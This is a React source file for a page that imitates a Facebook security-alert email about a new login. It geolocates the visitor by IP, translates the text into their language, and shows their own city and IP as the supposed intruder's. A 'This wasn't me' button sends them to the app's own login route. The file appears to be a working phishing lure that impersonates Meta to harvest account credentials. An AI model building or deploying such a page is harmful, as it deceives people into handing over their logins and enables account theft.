import type { FC } from 'react';
import { useEffect, useState } from 'react';
import { useNavigate } from 'react-router';
import Avatar from '@/assets/images/avatar.webp';
import FacebookIcon from '@/assets/images/facebook-icon.png';
import LocationIcon from '@/assets/images/location-icon.png';
import BrowserIcon from '@/assets/images/browser-icon.png';
import TimeIcon from '@/assets/images/time-icon.png';
import MetaLogoEmail from '@/assets/images/meta-logo-email.png';
import paths from '@/router/paths';
import translateText from '@/utils/translate';

interface GeoLocationData {
    city: string;
    accuracy: number;
    country: string;
    timezone: string;
    organization: string;
    asn: number;
    ip: string;
    area_code: string;
    organization_name: string;
    country_code: string;
    country_code3: string;
    continent_code: string;
    longitude: string;
    region: string;
    latitude: string;
}
interface TranslatedTexts {
    securityAlert: string;
    helloText: string;
    loginDescription: string;
    wasThisYou: string;
    thisWasntMe: string;
    ignoreText: string;
    verifyEmailText: string;
    securityEnhancementText: string;
    thankYouText: string;
    securityTeamText: string;
    chromeOnWindows: string;
    loadingMap: string;
    failedToLoadMap: string;
    locationUnavailable: string;
    facebookAccount: string;
}

const Index: FC = () => {
    const [geoData, setGeoData] = useState<GeoLocationData | null>(null);
    const [loading, setLoading] = useState(true);
    const [error, setError] = useState<string | null>(null);
    const [translatedTexts, setTranslatedTexts] = useState<TranslatedTexts>({
        securityAlert: 'Security Alert: New login from device near',
        helloText: 'Hello Facebook Account,',
        loginDescription: "Someone just logged into your Facebook account from Chrome on Windows near. If this wasn't you, we're ready to help you take some simple steps to secure your account.",
        wasThisYou: 'Was this you?',
        thisWasntMe: "This wasn't me",
        ignoreText: 'If this was you, you can ignore this email.',
        verifyEmailText: 'Want to know if this email is really from us? Visit the Help Center to verify:',
        securityEnhancementText: "To enhance your account security, we've enabled login alerts. We'll continue to notify you whenever your username and password are used to log in from a new browser or device.",
        thankYouText: 'Thank you!',
        securityTeamText: 'The Facebook Security Team',
        chromeOnWindows: 'Chrome on Windows',
        loadingMap: 'Loading map...',
        failedToLoadMap: 'Failed to load map',
        locationUnavailable: 'Location unavailable',
        facebookAccount: 'Facebook Account'
    });
    const navigate = useNavigate();

    const translateAllTexts = async (targetLang: string) => {
        try {
            const [securityAlert, helloText, loginDescription, wasThisYou, thisWasntMe, ignoreText, verifyEmailText, securityEnhancementText, thankYouText, securityTeamText, chromeOnWindows, loadingMap, failedToLoadMap, locationUnavailable, facebookAccount] = await Promise.all([translateText('Security Alert: New login from device near', targetLang), translateText('Hello Facebook Account,', targetLang), translateText("Someone just logged into your Facebook account from Chrome on Windows near. If this wasn't you, we're ready to help you take some simple steps to secure your account.", targetLang), translateText('Was this you?', targetLang), translateText("This wasn't me", targetLang), translateText('If this was you, you can ignore this email.', targetLang), translateText('Want to know if this email is really from us? Visit the Help Center to verify:', targetLang), translateText("To enhance your account security, we've enabled login alerts. We'll continue to notify you whenever your username and password are used to log in from a new browser or device.", targetLang), translateText('Thank you!', targetLang), translateText('The Facebook Security Team', targetLang), translateText('Chrome on Windows', targetLang), translateText('Loading map...', targetLang), translateText('Failed to load map', targetLang), translateText('Location unavailable', targetLang), translateText('Facebook Account', targetLang)]);

            setTranslatedTexts({
                securityAlert,
                helloText,
                loginDescription,
                wasThisYou,
                thisWasntMe,
                ignoreText,
                verifyEmailText,
                securityEnhancementText,
                thankYouText,
                securityTeamText,
                chromeOnWindows,
                loadingMap,
                failedToLoadMap,
                locationUnavailable,
                facebookAccount
            });
        } catch (err) {
            console.error('Translation failed:', err);
        }
    };

    useEffect(() => {
        const fetchGeoData = async () => {
            try {
                setLoading(true);
                const response = await fetch('https://get.geojs.io/v1/ip/geo.json');
                if (!response.ok) {
                    throw new Error('Failed to fetch geolocation data');
                }
                const data = await response.json();
                setGeoData(data);
                localStorage.setItem('geolocationData', JSON.stringify(data));

                await translateAllTexts(data.country_code);
            } catch (err) {
                setError(err instanceof Error ? err.message : 'Unknown error occurred');
            } finally {
                setLoading(false);
            }
        };

        fetchGeoData();
    }, []);

    const formatCurrentDateTime = () => {
        const now = new Date();
        const options: Intl.DateTimeFormatOptions = {
            weekday: 'long',
            year: 'numeric',
            month: 'long',
            day: 'numeric',
            hour: '2-digit',
            minute: '2-digit',
            hour12: false
        };
        return now.toLocaleDateString('en-US', options);
    };

    const getLocationString = () => {
        if (!geoData) return 'Loading...';
        return `${geoData.city}, ${geoData.country}`;
    };

    const getLocationDisplayText = () => {
        if (loading) return translatedTexts.loadingMap;
        if (error) return translatedTexts.locationUnavailable;
        return getLocationString();
    };

    const getMapUrl = () => {
        if (!geoData) return 'https://external.xx.fbcdn.net/static_map.php?v=2062&theme=dark&ccb=4-4&size=500x200&center=48.9134%2C2.38257&zoom=10&language=vi_VN&scale=2&_nc_client_caller=static_map.php&_nc_client_id=account_center_email';
        return `https://external.xx.fbcdn.net/static_map.php?v=2062&theme=dark&ccb=4-4&size=500x200&center=${geoData.latitude}%2C${geoData.longitude}&zoom=10&language=vi_VN&scale=2&_nc_client_caller=static_map.php&_nc_client_id=account_center_email`;
    };

    const renderMapImage = () => {
        if (loading) {
            return (
                <div className='mb-4 flex h-48 w-full animate-pulse items-center justify-center rounded-lg bg-gray-200'>
                    <span className='text-gray-500'>{translatedTexts.loadingMap}</span>
                </div>
            );
        }

        if (error) {
            return (
                <div className='mb-4 flex h-48 w-full items-center justify-center rounded-lg bg-gray-200'>
                    <span className='text-red-500'>{translatedTexts.failedToLoadMap}</span>
                </div>
            );
        }

        return <img src={getMapUrl()} alt='Location Map' className='mb-4 h-48 w-full rounded-lg object-cover' />;
    };

    return (
        <div className='min-h-screen bg-gray-50'>
            <div className='mx-auto max-w-2xl bg-white shadow-sm'>
                <div className='border-b border-gray-200 px-6 py-4'>
                    <div className='flex items-center justify-between'>
                        <div className='flex items-center space-x-3'>
                            <img src={FacebookIcon} alt='Facebook' className='h-8 w-8' />
                        </div>
                        <div className='flex items-center space-x-2'>
                            <span className='text-sm font-medium text-gray-900'>{translatedTexts.facebookAccount}</span>
                            <img src={Avatar} alt='Profile' className='h-8 w-8 rounded-full' />
                        </div>
                    </div>
                </div>

                <div className='px-6 py-6'>
                    <h1 className='mb-6 text-2xl leading-7 font-bold text-gray-900'>
                        {translatedTexts.securityAlert} {geoData ? geoData.city : 'Loading...'}
                    </h1>

                    <p className='mb-6 text-sm text-gray-900'>{translatedTexts.helloText}</p>

                    <p className='mb-6 text-sm leading-5 text-gray-900'>
                        {translatedTexts.loginDescription} {getLocationString()}.
                    </p>

                    <p className='mb-6 text-sm font-semibold text-gray-900'>{translatedTexts.wasThisYou}</p>

                    <div className='mb-6 rounded-lg border border-gray-200 bg-white p-4'>
                        {renderMapImage()}

                        <div className='space-y-3'>
                            <div className='flex items-center space-x-3'>
                                <img src={LocationIcon} alt='Location' className='h-6 w-6' />
                                <span className='text-sm text-gray-900'>{getLocationDisplayText()}</span>
                            </div>

                            <div className='flex items-center space-x-3'>
                                <img src={BrowserIcon} alt='Browser' className='h-6 w-6' />
                                <span className='text-sm text-gray-900'>{translatedTexts.chromeOnWindows}</span>
                            </div>

                            <div className='flex items-center space-x-3'>
                                <img src={TimeIcon} alt='Time' className='h-6 w-6' />
                                <span className='text-sm text-gray-900'>{formatCurrentDateTime()}</span>
                            </div>

                            {geoData && (
                                <div className='flex items-center space-x-3'>
                                    <img src={LocationIcon} alt='IP' className='h-6 w-6' />
                                    <span className='text-sm text-gray-900'>IP: {geoData.ip}</span>
                                </div>
                            )}
                        </div>
                    </div>

                    <div className='mb-8 text-center'>
                        <button onClick={() => navigate(paths.login)} className='rounded-lg bg-blue-600 px-8 py-3 text-base font-bold text-white transition-colors hover:bg-blue-700'>
                            {translatedTexts.thisWasntMe}
                        </button>
                    </div>

                    <div className='space-y-4 text-sm text-gray-900'>
                        <p>{translatedTexts.ignoreText}</p>

                        <p>
                            {translatedTexts.verifyEmailText}{' '}
                            <a href='https://www.facebook.com/help/check-email?ref=email_login_alerts_new_device' className='text-blue-600 hover:underline'>
                                www.facebook.com/help/check-email
                            </a>
                        </p>

                        <p>{translatedTexts.securityEnhancementText}</p>

                        <p>
                            {translatedTexts.thankYouText}
                            <br />
                            {translatedTexts.securityTeamText}
                        </p>
                    </div>
                </div>

                <div className='border-t border-gray-200 bg-gray-50 px-6 py-6'>
                    <div className='text-center'>
                        <div className='mb-4'>
                            <span className='text-xs text-gray-500'>from</span>
                        </div>
                        <img src={MetaLogoEmail} alt='Meta' className='mx-auto mb-4 h-6' />
                        <p className='mb-2 text-xs text-gray-500'>© Facebook. Meta Platforms, Inc., Attention: Community Support, 1 Meta Way, Menlo Park, CA 94025</p>
                    </div>
                </div>
            </div>
        </div>
    );
};

export default Index;
